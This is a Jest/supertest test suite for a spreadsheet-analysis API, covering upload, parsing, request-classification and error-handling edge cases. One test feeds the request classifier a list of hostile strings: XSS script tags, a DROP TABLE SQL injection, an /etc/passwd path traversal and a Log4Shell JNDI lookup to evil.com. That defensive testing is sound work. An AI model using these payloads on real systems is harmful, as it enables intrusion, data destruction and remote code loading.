import request from 'supertest';
import { app } from '../index';
import { SpreadsheetParser } from '../services/SpreadsheetParser';
import { ContextExtractor } from '../services/ContextExtractor';
import { RequestAnalyzer } from '../services/RequestAnalyzer';
import { OpenAIService } from '../services/OpenAIService';

describe('Bug Fixes and Edge Cases', () => {
  let spreadsheetParser: SpreadsheetParser;
  let contextExtractor: ContextExtractor;
  let requestAnalyzer: RequestAnalyzer;

  beforeAll(() => {
    spreadsheetParser = new SpreadsheetParser();
    contextExtractor = new ContextExtractor();
    requestAnalyzer = new RequestAnalyzer(new OpenAIService());
  });

  describe('File Upload Edge Cases', () => {
    test('should handle empty files gracefully', async () => {
      const response = await request(app)
        .post('/api/v1/upload-spreadsheet')
        .attach('file', Buffer.alloc(0), 'empty.xlsx')
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('EMPTY_FILE');
      expect(response.body.error.message).toContain('empty');
    });

    test('should handle corrupted Excel files', async () => {
      const corruptedData = Buffer.from('This is not a valid Excel file');
      
      const response = await request(app)
        .post('/api/v1/upload-spreadsheet')
        .attach('file', corruptedData, 'corrupted.xlsx')
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('INVALID_FILE_FORMAT');
    });

    test('should handle files with special characters in names', async () => {
      const testData = Buffer.from('test data');
      
      const response = await request(app)
        .post('/api/v1/upload-spreadsheet')
        .attach('file', testData, 'файл с русскими символами.xlsx')
        .expect(400); // Should fail due to invalid format, but handle filename gracefully

      expect(response.body.error).toBeDefined();
      // Should not crash due to special characters
    });

    test('should handle extremely large files', async () => {
      // Create a large buffer (10MB)
      const largeData = Buffer.alloc(10 * 1024 * 1024, 'a');
      
      const response = await request(app)
        .post('/api/v1/upload-spreadsheet')
        .attach('file', largeData, 'large.xlsx')
        .timeout(30000);

      // Should either succeed or fail gracefully with size limit error
      expect([200, 400, 413]).toContain(response.status);
      
      if (response.status !== 200) {
        expect(response.body.error).toBeDefined();
      }
    });

    test('should handle files with no extension', async () => {
      const testData = Buffer.from('test data');
      
      const response = await request(app)
        .post('/api/v1/upload-spreadsheet')
        .attach('file', testData, 'noextension')
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('INVALID_FILE_FORMAT');
    });
  });

  describe('Spreadsheet Parsing Edge Cases', () => {
    test('should handle spreadsheets with merged cells', async () => {
      const mergedCellData = {
        sheets: [{
          name: 'Sheet1',
          data: [
            [{ value: 'Merged Header', dataType: 'text', merged: { colspan: 2, rowspan: 1 } }, null],
            [{ value: 'Data 1', dataType: 'text' }, { value: 'Data 2', dataType: 'text' }]
          ],
          dimensions: { rows: 2, cols: 2 },
          formatting: []
        }],
        metadata: { fileName: 'merged.xlsx', fileSize: 1234 },
        formulas: [],
        namedRanges: []
      };

      const scopeInfo = {
        targetRange: 'A1:B2',
        relatedRanges: [],
        analysisType: 'data_analysis'
      };

      const context = await contextExtractor.extractRelevantData(scopeInfo, mergedCellData);
      
      expect(context).toBeDefined();
      expect(context.immediate.selectedData).toBeDefined();
      // Should handle merged cells without crashing
    });

    test('should handle spreadsheets with circular references', async () => {
      const circularData = {
        sheets: [{
          name: 'Sheet1',
          data: [
            [{ value: '=B1+1', dataType: 'formula' }, { value: '=A1+1', dataType: 'formula' }]
          ],
          dimensions: { rows: 1, cols: 2 },
          formatting: []
        }],
        metadata: { fileName: 'circular.xlsx', fileSize: 1234 },
        formulas: [
          { cell: 'A1', formula: '=B1+1', dependencies: ['B1'] },
          { cell: 'B1', formula: '=A1+1', dependencies: ['A1'] }
        ],
        namedRanges: []
      };

      const scopeInfo = {
        targetRange: 'A1',
        relatedRanges: ['B1'],
        analysisType: 'formula_assistance'
      };

      const context = await contextExtractor.extractRelevantData(scopeInfo, circularData);
      
      expect(context).toBeDefined();
      // Should detect circular reference and handle gracefully
      expect(context.warnings).toBeDefined();
      expect(context.warnings.some(w => w.type === 'circular_reference')).toBe(true);
    });

    test('should handle spreadsheets with very long formulas', async () => {
      const longFormula = '=SUM(' + Array.from({ length: 1000 }, (_, i) => `A${i + 1}`).join(',') + ')';
      
      const longFormulaData = {
        sheets: [{
          name: 'Sheet1',
          data: [
            [{ value: longFormula, dataType: 'formula' }]
          ],
          dimensions: { rows: 1, cols: 1 },
          formatting: []
        }],
        metadata: { fileName: 'long.xlsx', fileSize: 1234 },
        formulas: [
          { cell: 'A1', formula: longFormula, dependencies: Array.from({ length: 1000 }, (_, i) => `A${i + 1}`) }
        ],
        namedRanges: []
      };

      const scopeInfo = {
        targetRange: 'A1',
        relatedRanges: [],
        analysisType: 'formula_assistance'
      };

      const context = await contextExtractor.extractRelevantData(scopeInfo, longFormulaData);
      
      expect(context).toBeDefined();
      // Should handle long formulas without performance issues
    });

    test('should handle spreadsheets with special characters and Unicode', async () => {
      const unicodeData = {
        sheets: [{
          name: 'Sheet1',
          data: [
            [{ value: '🚀 Rocket', dataType: 'text' }, { value: 'Café', dataType: 'text' }, { value: '北京', dataType: 'text' }],
            [{ value: '∑∆∏', dataType: 'text' }, { value: 'Ñoño', dataType: 'text' }, { value: 'Москва', dataType: 'text' }]
          ],
          dimensions: { rows: 2, cols: 3 },
          formatting: []
        }],
        metadata: { fileName: 'unicode.xlsx', fileSize: 1234 },
        formulas: [],
        namedRanges: []
      };

      const scopeInfo = {
        targetRange: 'A1:C2',
        relatedRanges: [],
        analysisType: 'data_analysis'
      };

      const context = await contextExtractor.extractRelevantData(scopeInfo, unicodeData);
      
      expect(context).toBeDefined();
      expect(context.immediate.selectedData[0][0].value).toBe('🚀 Rocket');
      expect(context.immediate.selectedData[0][1].value).toBe('Café');
      expect(context.immediate.selectedData[0][2].value).toBe('北京');
    });

    test('should handle spreadsheets with mixed data types in same column', async () => {
      const mixedData = {
        sheets: [{
          name: 'Sheet1',
          data: [
            [{ value: 'Header', dataType: 'text' }],
            [{ value: 123, dataType: 'number' }],
            [{ value: 'Text', dataType: 'text' }],
            [{ value: new Date('2024-01-01'), dataType: 'date' }],
            [{ value: true, dataType: 'boolean' }],
            [{ value: '=SUM(A2)', dataType: 'formula' }],
            [{ value: null, dataType: 'empty' }],
            [{ value: '', dataType: 'empty' }]
          ],
          dimensions: { rows: 8, cols: 1 },
          formatting: []
        }],
        metadata: { fileName: 'mixed.xlsx', fileSize: 1234 },
        formulas: [
          { cell: 'A6', formula: '=SUM(A2)', dependencies: ['A2'] }
        ],
        namedRanges: []
      };

      const scopeInfo = {
        targetRange: 'A1:A8',
        relatedRanges: [],
        analysisType: 'data_analysis'
      };

      const context = await contextExtractor.extractRelevantData(scopeInfo, mixedData);
      
      expect(context).toBeDefined();
      expect(context.structural.dataTypes).toContain('text');
      expect(context.structural.dataTypes).toContain('number');
      expect(context.structural.dataTypes).toContain('date');
      expect(context.structural.dataTypes).toContain('boolean');
      expect(context.structural.dataTypes).toContain('formula');
      expect(context.structural.dataTypes).toContain('empty');
    });
  });

  describe('Request Analysis Edge Cases', () => {
    test('should handle extremely long requests', async () => {
      const longRequest = 'Please help me with this spreadsheet ' + 'data '.repeat(1000) + 'analysis';
      
      const result = await requestAnalyzer.classifyIntent(longRequest);
      
      expect(result).toBeDefined();
      expect(result.intent).toBeDefined();
      expect(result.confidence).toBeDefined();
      // Should handle long requests without crashing
    });

    test('should handle requests with only special characters', async () => {
      const specialCharRequests = [
        '!@#$%^&*()',
        '????????',
        '........',
        '--------',
        '========',
        '~~~~~~~~'
      ];

      for (const request of specialCharRequests) {
        const result = await requestAnalyzer.classifyIntent(request);
        
        expect(result).toBeDefined();
        expect(result.intent).toBeDefined();
        expect(result.confidence).toBeLessThan(0.5); // Should have low confidence
      }
    });

    test('should handle requests in different languages', async () => {
      const multilingualRequests = [
        'Calcular la suma de la columna A', // Spanish
        'Calculer la somme de la colonne A', // French
        'Berechne die Summe von Spalte A', // German
        '计算A列的总和', // Chinese
        'Вычислить сумму столбца A', // Russian
        'A列の合計を計算する' // Japanese
      ];

      for (const request of multilingualRequests) {
        const result = await requestAnalyzer.classifyIntent(request);
        
        expect(result).toBeDefined();
        expect(result.intent).toBeDefined();
        // Should attempt to classify even non-English requests
      }
    });

    test('should handle malicious input attempts', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'SELECT * FROM users; DROP TABLE users;',
        '../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>'
      ];

      for (const input of maliciousInputs) {
        const result = await requestAnalyzer.classifyIntent(input);
        
        expect(result).toBeDefined();
        expect(result.intent).toBeDefined();
        // Should sanitize and handle malicious input safely
      }
    });

    test('should handle requests with excessive whitespace', async () => {
      const whitespaceRequests = [
        '   Calculate   sum   of   column   A   ',
        '\n\n\nCalculate sum\n\n\n',
        '\t\t\tCalculate\tsum\t\t\t',
        '     ',
        '\n\n\n',
        '\t\t\t'
      ];

      for (const request of whitespaceRequests) {
        const result = await requestAnalyzer.classifyIntent(request);
        
        expect(result).toBeDefined();
        expect(result.intent).toBeDefined();
        // Should handle whitespace normalization
      }
    });
  });

  describe('Context Extraction Edge Cases', () => {
    test('should handle invalid range specifications', async () => {
      const testData = {
        sheets: [{
          name: 'Sheet1',
          data: [
            [{ value: 'A1', dataType: 'text' }, { value: 'B1', dataType: 'text' }],
            [{ value: 'A2', dataType: 'text' }, { value: 'B2', dataType: 'text' }]
          ],
          dimensions: { rows: 2, cols: 2 },
          formatting: []
        }],
        metadata: { fileName: 'test.xlsx', fileSize: 1234 },
        formulas: [],
        namedRanges: []
      };

      const invalidRanges = [
        'Z99:AA100', // Out of bounds
        'A1:A0', // Invalid range order
        'XYZ123', // Invalid cell reference
        '', // Empty range
        'A1:B2:C3', // Too many colons
        'Sheet2!A1', // Non-existent sheet
        'A1:B', // Incomplete range
        '1:2' // Row-only range
      ];

      for (const range of invalidRanges) {
        const scopeInfo = {
          targetRange: range,
          relatedRanges: [],
          analysisType: 'data_analysis'
        };

        const context = await contextExtractor.extractRelevantData(scopeInfo, testData);
        
        expect(context).toBeDefined();
        // Should handle invalid ranges gracefully
        if (context.warnings) {
          expect(context.warnings.some(w => w.type === 'invalid_range')).toBe(true);
        }
      }
    });

    test('should handle empty spreadsheets', async () => {
      const emptyData = {
        sheets: [{
          name: 'Sheet1',
          data: [],
          dimensions: { rows: 0, cols: 0 },
          formatting: []
        }],
        metadata: { fileName: 'empty.xlsx', fileSize: 1234 },
        formulas: [],
        namedRanges: []
      };

      const scopeInfo = {
        targetRange: 'A1',
        relatedRanges: [],
        analysisType: 'data_analysis'
      };

      const context = await contextExtractor.extractRelevantData(scopeInfo, emptyData);
      
      expect(context).toBeDefined();
      expect(context.immediate.selectedData).toEqual([]);
      expect(context.warnings).toBeDefined();
      expect(context.warnings.some(w => w.type === 'empty_spreadsheet')).toBe(true);
    });

    test('should handle spreadsheets with only formulas', async () => {
      const formulaOnlyData = {
        sheets: [{
          name: 'Sheet1',
          data: [
            [{ value: '=1+1', dataType: 'formula' }, { value: '=A1*2', dataType: 'formula' }],
            [{ value: '=SUM(A1:B1)', dataType: 'formula' }, { value: '=AVERAGE(A1:B1)', dataType: 'formula' }]
          ],
          dimensions: { rows: 2, cols: 2 },
          formatting: []
        }],
        metadata: { fileName: 'formulas.xlsx', fileSize: 1234 },
        formulas: [
          { cell: 'A1', formula: '=1+1', dependencies: [] },
          { cell: 'B1', formula: '=A1*2', dependencies: ['A1'] },
          { cell: 'A2', formula: '=SUM(A1:B1)', dependencies: ['A1', 'B1'] },
          { cell: 'B2', formula: '=AVERAGE(A1:B1)', dependencies: ['A1', 'B1'] }
        ],
        namedRanges: []
      };

      const scopeInfo = {
        targetRange: 'A1:B2',
        relatedRanges: [],
        analysisType: 'formula_assistance'
      };

      const context = await contextExtractor.extractRelevantData(scopeInfo, formulaOnlyData);
      
      expect(context).toBeDefined();
      expect(context.immediate.selectedData.every(row => 
        row.every(cell => cell.dataType === 'formula')
      )).toBe(true);
      expect(context.related.relatedFormulas.length).toBeGreaterThan(0);
    });
  });

  describe('API Error Handling Edge Cases', () => {
    test('should handle malformed JSON requests', async () => {
      const response = await request(app)
        .post('/api/v1/analyze-context')
        .set('Content-Type', 'application/json')
        .send('{"invalid": json}')
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('INVALID_JSON');
    });

    test('should handle missing required fields', async () => {
      const response = await request(app)
        .post('/api/v1/analyze-context')
        .send({
          // Missing required fields
        })
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('MISSING_REQUIRED_FIELDS');
    });

    test('should handle requests with null values', async () => {
      const response = await request(app)
        .post('/api/v1/analyze-context')
        .send({
          request: null,
          spreadsheet_id: null,
          current_selection: null
        })
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toBeDefined();
    });

    test('should handle requests with wrong data types', async () => {
      const response = await request(app)
        .post('/api/v1/analyze-context')
        .send({
          request: 123, // Should be string
          spreadsheet_id: true, // Should be string
          current_selection: "not an object" // Should be object
        })
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('INVALID_DATA_TYPES');
    });

    test('should handle extremely large request payloads', async () => {
      const largePayload = {
        request: 'Analyze this data',
        spreadsheet_id: 'test-id',
        current_selection: {
          sheet: 'Sheet1',
          range: 'A1:A1',
          active_cell: 'A1'
        },
        large_data: 'x'.repeat(10 * 1024 * 1024) // 10MB of data
      };

      const response = await request(app)
        .post('/api/v1/analyze-context')
        .send(largePayload)
        .timeout(30000);

      // Should either succeed or fail gracefully with payload size error
      expect([200, 400, 413]).toContain(response.status);
    });

    test('should handle concurrent requests to same spreadsheet', async () => {
      // This test would require a valid spreadsheet ID
      // For now, we'll test that concurrent invalid requests are handled properly
      
      const requests = Array.from({ length: 10 }, () =>
        request(app)
          .post('/api/v1/analyze-context')
          .send({
            request: 'Test concurrent request',
            spreadsheet_id: 'non-existent-id',
            current_selection: {
              sheet: 'Sheet1',
              range: 'A1:A1',
              active_cell: 'A1'
            }
          })
      );

      const responses = await Promise.all(requests);
      
      // All should fail with the same error (spreadsheet not found)
      responses.forEach(response => {
        expect(response.status).toBe(404);
        expect(response.body.success).toBe(false);
        expect(response.body.error.code).toBe('SPREADSHEET_NOT_FOUND');
      });
    });
  });

  describe('Memory and Performance Edge Cases', () => {
    test('should handle memory pressure gracefully', async () => {
      // Create a large data structure to simulate memory pressure
      const largeArray = Array.from({ length: 100000 }, (_, i) => ({
        id: i,
        data: 'x'.repeat(1000)
      }));

      // Make a request while memory is under pressure
      const response = await request(app)
        .post('/api/v1/analyze-context')
        .send({
          request: 'Test under memory pressure',
          spreadsheet_id: 'test-id',
          current_selection: {
            sheet: 'Sheet1',
            range: 'A1:A1',
            active_cell: 'A1'
          }
        });

      // Should handle gracefully (either succeed or fail with appropriate error)
      expect([200, 404, 500]).toContain(response.status);
      
      // Clean up
      largeArray.length = 0;
    });

    test('should handle timeout scenarios', async () => {
      // This test would require mocking slow operations
      // For now, we'll test that the API responds within reasonable time
      
      const startTime = Date.now();
      
      const response = await request(app)
        .post('/api/v1/analyze-context')
        .send({
          request: 'Test timeout handling',
          spreadsheet_id: 'test-id',
          current_selection: {
            sheet: 'Sheet1',
            range: 'A1:A1',
            active_cell: 'A1'
          }
        })
        .timeout(10000);

      const responseTime = Date.now() - startTime;
      
      // Should respond within 10 seconds
      expect(responseTime).toBeLessThan(10000);
      expect(response.status).toBeDefined();
    });

    test('should handle rapid successive requests', async () => {
      const rapidRequests = Array.from({ length: 20 }, (_, i) =>
        request(app)
          .post('/api/v1/analyze-context')
          .send({
            request: `Rapid request ${i}`,
            spreadsheet_id: 'test-id',
            current_selection: {
              sheet: 'Sheet1',
              range: 'A1:A1',
              active_cell: 'A1'
            }
          })
      );

      const startTime = Date.now();
      const responses = await Promise.allSettled(rapidRequests);
      const endTime = Date.now();

      console.log(`Rapid requests completed in ${endTime - startTime}ms`);

      // Should handle all requests (either successfully or with appropriate errors)
      responses.forEach(result => {
        if (result.status === 'fulfilled') {
          expect(result.value.status).toBeDefined();
        } else {
          expect(result.reason).toBeDefined();
        }
      });
    });
  });

  describe('Data Integrity Edge Cases', () => {
    test('should handle data corruption during processing', async () => {
      // Simulate data corruption by modifying data structure during processing
      const corruptibleData = {
        sheets: [{
          name: 'Sheet1',
          data: [
            [{ value: 'Test', dataType: 'text' }]
          ],
          dimensions: { rows: 1, cols: 1 },
          formatting: []
        }],
        metadata: { fileName: 'test.xlsx', fileSize: 1234 },
        formulas: [],
        namedRanges: []
      };

      // Corrupt the data during processing
      setTimeout(() => {
        if (corruptibleData.sheets[0]) {
          corruptibleData.sheets[0].data = null;
        }
      }, 10);

      const scopeInfo = {
        targetRange: 'A1',
        relatedRanges: [],
        analysisType: 'data_analysis'
      };

      try {
        const context = await contextExtractor.extractRelevantData(scopeInfo, corruptibleData);
        expect(context).toBeDefined();
        // Should handle corruption gracefully
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
        expect(error.message).toBeDefined();
      }
    });

    test('should validate data consistency', async () => {
      const inconsistentData = {
        sheets: [{
          name: 'Sheet1',
          data: [
            [{ value: 'A1', dataType: 'text' }, { value: 'B1', dataType: 'text' }]
          ],
          dimensions: { rows: 2, cols: 3 }, // Inconsistent with actual data
          formatting: []
        }],
        metadata: { fileName: 'test.xlsx', fileSize: 1234 },
        formulas: [
          { cell: 'C1', formula: '=A1+B1', dependencies: ['A1', 'B1'] } // References non-existent cell
        ],
        namedRanges: []
      };

      const scopeInfo = {
        targetRange: 'A1:B1',
        relatedRanges: [],
        analysisType: 'data_analysis'
      };

      const context = await contextExtractor.extractRelevantData(scopeInfo, inconsistentData);
      
      expect(context).toBeDefined();
      expect(context.warnings).toBeDefined();
      expect(context.warnings.some(w => w.type === 'data_inconsistency')).toBe(true);
    });
  });
});